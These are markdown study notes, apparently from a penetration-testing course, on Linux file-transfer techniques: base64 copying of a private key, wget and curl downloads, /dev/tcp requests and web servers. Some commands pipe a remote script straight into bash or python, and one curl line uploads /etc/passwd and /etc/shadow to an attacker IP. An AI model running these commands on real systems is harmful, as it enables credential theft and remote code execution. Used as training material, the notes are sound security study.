# Linux File Transfers Methods

<!-- TOC -->
* [Linux File Transfers Methods](#linux-file-transfers-methods)
  * [Base64 Encoding / Decoding](#base64-encoding--decoding)
    * [Pwnbox](#pwnbox)
    * [Linux Target Machine](#linux-target-machine)
  * [Web Downloads with Wget and cURL](#web-downloads-with-wget-and-curl)
    * [Download a File Using wget](#download-a-file-using-wget)
    * [Download a File Using cURL](#download-a-file-using-curl)
  * [Fileless Attacks Using Linux](#fileless-attacks-using-linux)
    * [Fileless Download with cURL](#fileless-download-with-curl)
    * [Fileless Download with wget](#fileless-download-with-wget)
  * [Download with Bash (/dev/tcp)](#download-with-bash-devtcp)
    * [Connect to the Target Webserver](#connect-to-the-target-webserver)
    * [HTTP GET Request](#http-get-request)
    * [Print the Response](#print-the-response)
    * [Close the Connection](#close-the-connection)
  * [Web Upload](#web-upload)
    * [Linux - Upload Multiple Files](#linux---upload-multiple-files)
  * [Alternative Web File Transfer Method](#alternative-web-file-transfer-method)
    * [Linux - Creating a Web Server with Python3](#linux---creating-a-web-server-with-python3)
    * [Linux - Creating a Web Server with Python2.7](#linux---creating-a-web-server-with-python27)
    * [Linux - Creating a Web Server with PHP](#linux---creating-a-web-server-with-php)
    * [Linux - Creating a Web Server with Ruby](#linux---creating-a-web-server-with-ruby)
<!-- TOC -->

## Base64 Encoding / Decoding

- Depending on the file size we want to transfer, we can use a method that does not require network communication
- Encode a file to a base64 string, copy its content into the terminal and perform the reverse operation.
- Use `cat` to print the file content, and `base64` encode the output using a pipe `|`.
- We used the option `-w 0` to **create only one line** and ended up with the command with a semi-colon (;) and `echo` keyword to start a new line and make it easier to copy.

### Pwnbox

```bash
  md5sum id_rsa
  # 4e301756a07ded0a2dd6953abf015278  id_rsa
  cat id_rsa |base64 -w 0;echo
  # IDRSA_BASE64_STRING
```

- Copy this content, paste it onto our Linux target machine, and use `base64` with the option `-d` to decode it.

### Linux Target Machine

```bash
  echo -n IDRSA_BASE64_STRING | base64 -d > id_rsa
  md5sum id_rsa
  # 4e301756a07ded0a2dd6953abf015278  id_rsa
```

> Note: You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.

## Web Downloads with Wget and cURL

### Download a File Using wget

To download a file using `wget`, we need to specify the URL and the option uppercase `-O` to set the output filename.

```bash
  wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

### Download a File Using cURL

`cURL` is very similar to `wget`, but the output filename option is lowercase `-o`.

```bash
  curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Fileless Attacks Using Linux

> Note: Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create
> temporary files on the OS.

### Fileless Download with cURL

Let's take the `cURL` command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.

```bash
  curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

### Fileless Download with wget

Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.

```bash
  wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
    # Hello World!
```

## Download with Bash (/dev/tcp)

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the
built-in /dev/TCP device file can be used for simple file downloads.

### Connect to the Target Webserver

```bash
  exec 3<>/dev/tcp/10.10.10.32/80
```

- `exec` is a Bash utility that can manipulate file descriptors.
- `3<>` opens file descriptor number 3 for reading and writing.
- `/dev/tcp/10.10.10.32/80` is a special Bash feature **(if enabled)** that allows you to open a direct TCP connection to IP `10.10.10.32` on port `80` (HTTP).

In summary, this command opens a TCP network connection to the specified address and port, and associates it with file descriptor 3. You can then read and write data through that descriptor using Bash
as if it were a normal file. This is useful for transferring data or interacting with network services without external tools like `nc`, `curl`, or `wget`.

In Linux, a file descriptor is an integer that uniquely identifies an open connection to a file, socket, pipe, etc., within a process. The standard descriptors are:

- 0: standard input (`stdin`)
- 1: standard output (`stdout`)
- 2: standard error (`stderr`)

You can open more files or connections, and each will receive an additional descriptor (3, 4, 5, ...), up to a limit defined by the operating system (checkable with `ulimit -n`). Descriptors are used
to read, write, or manipulate files and I/O resources from programs and scripts.

### HTTP GET Request

```bash 
  echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3 sends a simple HTTP GET request through file descriptor 3, which was previously opened as a TCP connection to a web server. Specifically:

- `echo -e` allows escape characters like \n (newline) to be interpreted.
- `"GET /LinEnum.sh HTTP/1.1\n\n"` is the HTTP request asking for the /LinEnum.sh file using the HTTP/1.1 protocol.
- `>&3` redirects the command output to file descriptor 3, that is, to the open TCP connection.
  En resumen, este comando envía una petición HTTP GET manualmente a través de una conexión TCP abierta desde Bash

### Print the Response

`cat <&3` reads the response from the TCP connection associated with file descriptor 3 and prints it to standard output (stdout).

```bash
  cat <&3
```

**Save the Response to a File**

To save the response to a file, we can redirect the output of the `cat` command to a file and used sed to remove the HTTP headers response before save the content.

```bash
  cat <&3  | sed '1,/^\r\?$/d' > /tmp/LinEnum.sh
```

**Explanation of the argument:**

- `1,`: Indicates the start of the range, from the first line.
- `/^\r\?$/`: This is a regular expression that looks for the first empty line.
    - `^`: Start of line.
    - `\r\?`: Zero or one carriage return character (used in Windows, optional here).
    - `$`: End of line.
    - Together, it matches an empty line, with or without a carriage return.
- `d`: Means "delete". Deletes all lines in the specified range.

Deletes from the first line up to the first empty line (inclusive). This is useful for removing the HTTP headers from a response, leaving only the actual file content.

### Close the Connection

Finally, we close the file descriptor to release the resources associated with it.

```bash
  exec 3<&-
```

## Web Upload

```bash
  # Install the uploadserver module.
  python3 -m pip install --user uploadserver
  # Now we need to create a self-signed certificate.
  openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
  # The webserver should not host the certificate. Creating a new directory to host the file for our webserver.
  mkdir https && cd https
  sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Este comando genera un certificado autofirmado y una clave privada en un solo archivo llamado server.pem. Paso a paso:

- `openssl req`: Inicia la utilidad de OpenSSL para crear y procesar solicitudes de certificados X.509.
- `-x509`: Indica que se debe crear un certificado autofirmado en vez de una solicitud de firma (CSR).
- `-out server.pem`: Especifica el archivo de salida donde se guardará el certificado.
- `-keyout server.pem`: Especifica el archivo donde se guardará la clave privada (en este caso, el mismo archivo que el certificado).
- `-newkey rsa:2048`: Genera una nueva clave privada RSA de 2048 bits.
- `-nodes`: No cifra la clave privada (no pide contraseña).
- `-sha256`: Usa el algoritmo de hash SHA-256 para firmar el certificado.
- `-subj '/CN=server'`: Define el sujeto del certificado, en este caso, el nombre común (CN) es "server".

Resultado: Se crea un archivo server.pem que contiene tanto el certificado autofirmado como la clave privada, útil para pruebas o servidores locales.

### Linux - Upload Multiple Files

```bash
  # Upload multiple files using the uploadserver.
  curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

We used the option `--insecure` because we used a self-signed certificate that we trust.

## Alternative Web File Transfer Method

### Linux - Creating a Web Server with Python3

```bash
  python3 -m http.server
  # Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Linux - Creating a Web Server with Python2.7
```bash
  python2.7 -m SimpleHTTPServer
  # Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Linux - Creating a Web Server with PHP

```bash
  php -S 0.0.0.0:8000
  # [Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

### Linux - Creating a Web Server with Ruby

```bash
  ruby -run -ehttpd . -p8000
```